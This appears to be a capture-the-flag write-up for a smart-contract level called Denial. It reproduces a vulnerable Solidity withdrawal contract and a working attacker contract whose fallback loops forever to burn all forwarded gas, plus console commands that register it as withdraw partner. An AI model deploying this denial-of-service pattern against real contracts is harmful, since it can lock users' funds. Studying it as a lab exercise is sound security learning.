/*
There are 2 different ways to abuse the contract

We are abusing the fact that the call method didn't specify any gas limitation. If we use up all the gas we can block the function from actually finishing.

1. First Version to Attack

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//  the infinite loop will drain all the gas
contract AttackDenial {
    fallback() external payable{
        while(true){}
    }
}


2. Reentrancy

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
} 

contract AttackWithReentrancy{
 // I have covered reentrancy in a challenge before, you can just copy and replace the function names.
}


-----------------------
Now set the partner to either of your attack contracts:
contract.setWithdrawPartner("your contract address");

contract.withdraw()

*/
